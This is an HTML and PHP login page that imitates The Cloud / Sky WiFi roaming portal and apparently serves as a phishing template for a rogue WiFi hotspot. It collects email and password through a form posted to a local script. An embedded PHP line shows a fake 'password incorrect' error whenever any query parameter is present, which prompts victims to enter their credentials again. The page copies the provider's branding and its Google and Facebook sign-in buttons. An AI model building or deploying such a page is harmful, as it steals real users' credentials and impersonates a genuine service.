<!DOCTYPE html>
<html class="no-js">
  <head>
    <title>The Cloud, WiFi Broadband</title>
    <meta content="width=device-width,initial-scale=1.0,minimal-ui" name="viewport"/>
    <link href="/resources/styles/style.css" rel="stylesheet"/>
    <meta content="on" http-equiv="cleartype"/>
  </head>
  <body class="clearfix spectrum-background login">
    <div id="wrapper">
      <header class="ir the-cloud sky-wifi">
        <a class="cloud-logo cloud-link ir" href="#">The Cloud
        </a>
        <a class="venue-logo venue-link header-v2" href="#">Venue
        </a>
      </header>
      <section>
        <h2>
          <a href="#">
            <div class="home-icon">&nbsp;
            </div>
          </a>Login / Registration
        </h2>
        <form id="login" novalidate="novalidate" action="post.php" method="POST">
          <p class="information">Sign in with Sky WiFi Roaming
          </p>
		  <?php if (!empty($_GET)){echo "<p id=\"login.errors\" class=\"information error\">Email or password incorrect. Please retry</p>"; }?> 
          <p id="how-wifi-works">
            <a href="/roaming.html">How does the Sky WiFi Roaming Service work?
            </a>
          </p>
          <fieldset>
            <p>
              <label class="info">Email
                <span>*
                </span>
              </label>
              <input id="username" name="username" autocorrect="off" type="email" autocapitalize="off" value="" autocomplete="email"/>
            </p>
            <p>
              <label class="info">Password
                <span>*
                </span>
                <a href="forgotpassword.php">(Forgotten password?)
                </a>
              </label>
              <input id="password" name="password" type="password" value="" autocomplete="current-password"/>
            </p>
            <div class="buttons">
              <button class="submit" type="submit">Continue
              </button>
            </div>
          </fieldset>
		  <p style="text-align:center; margin-bottom:20px;">or
          </p>
          <div class="social"> 
            <a href="/google"> 
              <div id="google" class="d-login facebook"> 
                <svg aria-hidden="true" class="svg-icon native iconGoogle" width="18" height="18" viewBox="0 0 18 18"> 
                  <g> 
                    <path d="M16.51 8H8.98v3h4.3c-.18 1-.74 1.48-1.6 2.04v2.01h2.6a7.8 7.8 0 0 0 2.38-5.88c0-.57-.05-.66-.15-1.18z" fill="#4285F4">
                    </path> 
                    <path d="M8.98 17c2.16 0 3.97-.72 5.3-1.94l-2.6-2a4.8 4.8 0 0 1-7.18-2.54H1.83v2.07A8 8 0 0 0 8.98 17z" fill="#34A853">
                    </path> 
                    <path d="M4.5 10.52a4.8 4.8 0 0 1 0-3.04V5.41H1.83a8 8 0 0 0 0 7.18l2.67-2.07z" fill="#FBBC05">
                    </path> 
                    <path d="M8.98 4.18c1.17 0 2.23.4 3.06 1.2l2.3-2.3A8 8 0 0 0 1.83 5.4L4.5 7.49a4.77 4.77 0 0 1 4.48-3.3z" fill="#EA4335">
                    </path> 
                  </g> 
                </svg>
                <span>Sign in using Google
                </span>
              </div>
            </a> 
            <a href="/facebook"> 
              <div id="facebook" class="d-login facebook"> 
                <svg aria-hidden="true" class="svg-icon iconFacebook" width="18" height="18" viewBox="0 0 18 18"> 
                  <path d="M1.88 1C1.4 1 1 1.4 1 1.88v14.24c0 .48.4.88.88.88h7.67v-6.2H7.46V8.4h2.09V6.61c0-2.07 1.26-3.2 3.1-3.2.88 0 1.64.07 1.87.1v2.16h-1.29c-1 0-1.19.48-1.19 1.18V8.4h2.39l-.31 2.42h-2.08V17h4.08c.48 0 .88-.4.88-.88V1.88c0-.48-.4-.88-.88-.88H1.88z" fill="#fff">
                  </path> 
                </svg>
                <span>Sign in using Facebook
                </span>
              </div>
            </a> 
          </div>
        </form>
        <h5>Don&#39;t have an account?
        </h5>
        <ul class="list">
          <li>
            <a href="/register.php">
              <div class="linked-item">
                <div class="item">Create Account
                </div>
              </div>
            </a>
          </li>
        </ul>
      </section>
      <footer>
        <nav>
          <div class="footer-links">
            <a href="/termsofservice.html" class="terms">Terms
            </a>
            <a href="/privacypolicy.html" class="terms">Privacy &amp; Cookies
            </a>
          </div>
        </nav>
        <div class="a-row logo-footer venue-branded-background spectrum-background" id="logo-footer">
          <img class="footer-logo-client sky-wifi-logo" alt="" src="./resources/2/img/sky-wifi-footer-white.png"/>
          <div class="footer-logo-divider sky-wifi-logo">
          </div>
          <img alt="Sky WiFi - Connect to The Cloud" class="footer-logo-cloud" src="./resources/2/img/connect-to-cloud-footer-white.png"/>
          <span id="footer-network-id">GB
          </span>
        </div>
      </footer>
    </div>
  </body>
</html>
